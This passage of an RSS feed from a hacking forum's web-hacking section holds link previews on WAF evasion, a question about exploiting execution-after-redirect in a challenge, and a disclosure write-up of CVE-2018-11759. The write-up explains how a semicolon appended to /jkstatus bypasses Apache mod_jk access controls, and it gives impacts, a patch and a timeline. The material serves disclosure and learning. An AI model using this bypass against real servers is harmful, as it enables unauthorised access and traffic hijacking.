      <a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener nofollow ugc" title="04:44PM - 25 February 2018">Medium – 25 Feb 18</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8f66716f300b4dc3f3ba7022c82bcec1e6678099.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0" target="_blank" rel="noopener nofollow ugc">Web Application Firewall (WAF) Evasion Techniques #2</a></h3>

<p>String concatenation in a Remote Command Execution payload makes you able to bypass firewall rules (Sucuri, ModSecurity)</p>

  <p><span class="label1">Reading time: 9 min read</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox wikipedia">
  <header class="source">
      <a href="https://en.wikipedia.org/wiki/Numeric_character_reference" target="_blank" rel="noopener nofollow ugc">en.wikipedia.org</a>
  </header>
  <article class="onebox-body">
    

<h3><a href="https://en.wikipedia.org/wiki/Numeric_character_reference" target="_blank" rel="noopener nofollow ugc">Numeric character reference</a></h3>

<p>A numeric character reference (NCR) is a common markup construct used in SGML and SGML-derived markup languages such as HTML and XML. It consists of a short sequence of characters that, in turn,  represents a single character. Since WebSgml, XML and HTML 4, the code points of the Universal Character Set (UCS) of Unicode are used. NCRs are typically used in order to represent characters that are not directly encodable in a particular document (for example, because they are international characters...</p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228</link>
          <pubDate>Tue, 12 Mar 2019 16:10:07 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-12228</guid>
          <source url="https://0x00sec.org/t/fun-bypass-xss-detection-waf/12228.rss">[FUN] Bypass XSS Detection WAF</source>
        </item>
        <item>
          <title>[ASK] Execution After Redirect ( EAR )</title>
          <dc:creator><![CDATA[sp3tre]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p>Hello everyone. I was doing challenges on the website that had a clue in challenges:</p>
<p>There is a “execution after redirect” to one of the login pages</p>
<p>I’ve done a test with burp, and get /user who’s re-directed to the /user/login with the response 302 found, and /cmsadmin to / with the response 301 moved permanently, But when I went change request location to /admin/1 response was “access denied”.<br>
And I’ve been crawling all over the website with a dirbuster.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3725952d4850d14d1a7128e41965dc30033ef2e4.png" alt="Screenshot_2019-01-19_13-38-20" data-base62-sha1="7RQMs1UNaKqeZUvD4mzC7qyml6I" width="483" height="323"><br>
How do I manipulate this EAR? And how do I know the possible files/dir for bypass?</p>
<p>Please, i need ur help. Thanks a lot <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
            <p><small>6 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/ask-execution-after-redirect-ear/10981">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/ask-execution-after-redirect-ear/10981</link>
          <pubDate>Sat, 19 Jan 2019 07:08:00 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-10981</guid>
          <source url="https://0x00sec.org/t/ask-execution-after-redirect-ear/10981.rss">[ASK] Execution After Redirect ( EAR )</source>
        </item>
        <item>
          <title>[CVE-2018-11759] Apache mod_jk access control bypass</title>
          <dc:creator><![CDATA[Nitrax]]></dc:creator>
          <category>Web Hacking</category>
          <description><![CDATA[
            <p><strong>DISCLAIMER:</strong> Article originally published on <a href="https://www.immunit.ch/blog/2018/11/01/cve-2018-11759-apache-mod_jk-access-bypass/" rel="noopener nofollow ugc">immunIT </a></p>
<hr>
<p>Hi fellas,</p>
<p>I’m exiting to introduce you to a new vulnerability found by my colleague (Xel) and me during one of our pentesting engagements <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>I almost had my first CVE on <a href="https://0x00sec.org/t/wordpress-has-never-been-safer/1875">Wordpress</a> a year ago but now here we are!</p>
<h1>Vulnerability summary</h1>
<ol>
<li>
<p>Due to discrepancies between the specifications of httpd and Tomcat for path handling, Apache mod_jk Connector 1.2.0 to 1.2.44 access controls to endpoints defined by a JkMount httpd directive can be bypassed.</p>
</li>
<li>
<p>Notably, if a read-only JK status manager interface is available, it is possible to disclose the internal routes of AJP services served by mod_jk.</p>
</li>
<li>
<p>Furthermore, if a read-write JK status manager interface is available, it is possible to hijack or shutdown all traffic traversing mod_jk by altering the configuration of AJP workers, or to conduct internal port scanning.</p>
</li>
</ol>
<h1>Technical details</h1>
<h2>Patch-diffing CVE-2018-1323</h2>
<p>During a penetration test for one of our customers involving a load balancer/reverse-proxy based on Apache mod_jk serving JBoss/Tomcat webservers, we found out about vulnerability CVE-2018-1323 (reported by Alphan YAVAS from Biznet Bilisim A.S.) affecting mod_jk up to version 1.2.42.</p>
<p>After analyzing the mod_jk 1.2.43 patch to understand this vulnerability, we realized it was a path traversal based on discrepancies between how Apache httpd and Tomcat or other Java servers handled the semicolon character for path resolution.</p>
<p>Apache httpd interprets semicolons in URL as ordinary characters for path resolution, while Tomcat interprets them as query delimiters (with a similar functionality as “?”). Thus, an attacker could fetch a path such as <code>http://server/java_app/..;</code> did not trigger a path traversal for the logic of httpd, it was forwarded as is to the Tomcat webserver, which interpreted the string as <code>..</code> .</p>
<p>This allowed to fetch resources that were not supposed to be accessible on the Tomcat webserver.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bb56bfc37ab11b7a9b5d39df5fd39fd0276837cc.jpeg" alt="patch_diffing" data-base62-sha1="qJh93h2Yulkzx0PUUzRCcCZX0HG" width="445" height="500"></p>
<p>We have identified that the vulnerability was not fully understood, as the mod_jk patch did fix this specific path traversal attack against mod_jk, but not the core issue revolving around the handling of semicolons by mod_jk.</p>
<h2>Playing with the JK Status Manager</h2>
<p>The JK status manager is an administration interface for mod_jk. When set in read-write, it allows the configuration of AJP workers to connect to Java Web servers to proxy HTTP requests to them.<br>
It is normally possible to restrict access to the JK status manager, for example by using httpd directives such as:</p>
<pre><code class="lang-bash">&lt;Location /jkstatus&gt;

JKMount jk-status
Require ip 127.0.0.1

&lt;/Location&gt;
</code></pre>
<p>This directive is supposed to prevent any external access to the JK status manager.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2bba8f2d8807e3818929cfc2ceef18cc6b8309a4.jpeg" alt="JKSTATUS" data-base62-sha1="6eQeqlKRLdab2E4WPnh9ECvChww" width="690" height="203"></p>
<p>We found out that by injecting a semicolon behind the /jkstatus URL, it was possible to bypass such a restriction.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/625d73a93aa5e8420669deae51464a9a5daedb2d.jpeg" alt="JK_BYPASS" data-base62-sha1="e2b0IPUeq529kM7oNXjdhG0jsQZ" width="676" height="499"></p>
<p>It is possible to submit GET parameters after this URL, so that state-changing requests can be made to the JK manager.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/622f7b2815d3f40025ed715808f6f5a91a2748bc.jpeg" alt="JK_DUMP" data-base62-sha1="e0AweiIsacrr6eXxEVfKR1uII1K" width="577" height="500"></p>
<p>The impact of acccess bypass on the JK manager could be a denial of service of all applications served by mod_jk, by changing ports used by workers if the JK status manager is set with read-write access, and possibly the hijacking of all web applications served by mod_jk if an attacker connects the corresponding AJP workers to a server in his control.</p>
<p>It would also be theoretically possible to conduct internal TCP port scanning, by changing the destination and port of an AJP worker to an internal host and port, because of the discrepancy of error messages returned by the manager depending on whether the submitted AJP port is valid or not (Bad Gateway versus Service Unavailable). The full impact of this type of SSRF is unknown.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3d634bbe49bf5d0591aac2aec2deb4ba30c5f807.jpeg" alt="LAST" data-base62-sha1="8L3RHnhJNtkXzYn0w5Uq5kBGdW7" width="603" height="500"></p>
<p>The JK manager (in read-only) also discloses the hostnames, IPs and ports of internal servers, routes that are served by mod_jk, and the absolute path of the httpd server on the filesystem.</p>
<p>This example of access bypass has a high impact. However, it has to be noted that access control to any endpoint defined through a JkMount directive could possibly be bypassed by a semicolon injection.</p>
<h1>Mitigation</h1>
<p>A patch is available for mod_jk (<a href="https://tomcat.apache.org/download-connectors.cgi" rel="noopener nofollow ugc">version 1.2.46</a>).<br>
Other mitigations include the use of Location values such as <code>/jkstatus*</code> , which seems to fix the issue.</p>
<h1>Bug reference</h1>
<p><a href="https://mail-archives.us.apache.org/mod_mbox/www-announce/201810.mbox/%3c16a616e5-5245-f26a-a5a4-2752b2826703@apache.org%3e" rel="noopener nofollow ugc">CVE-2018-11759</a></p>
<h1>Github POC</h1>
<p>A Docker environment is available to test this vulnerability on our <a href="https://github.com/immunIT/CVE-2018-11759" rel="noopener nofollow ugc">GitHub</a></p>
<h1>Timeline</h1>
<ul>
<li>06/09/2018 : First contact with Apache Tomcat security team</li>
<li>06/09/2018 : First response from Apache Tomcat security team</li>
<li>13/10/2018 : <a href="https://tomcat.apache.org/download-connectors.cgi" rel="noopener nofollow ugc">mod_jk v1.2.46 fix is released</a>
</li>
<li>31/10/2018 : CVE-2018-11759 advisory is issued</li>
<li>01/11/2018 : Full disclosure</li>
</ul>
<p>I hope you enjoyed your reading and find this finding interesting.</p>
<p>Best,<br>
Nitrax</p>
            <p><small>7 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/cve-2018-11759-apache-mod-jk-access-control-bypass/9273">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/cve-2018-11759-apache-mod-jk-access-control-bypass/9273</link>
          <pubDate>Fri, 02 Nov 2018 08:37:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-9273</guid>
          <source url="https://0x00sec.org/t/cve-2018-11759-apache-mod-jk-access-control-bypass/9273.rss">[CVE-2018-11759] Apache mod_jk access control bypass</source>
        </item>
  </channel>
</rss>
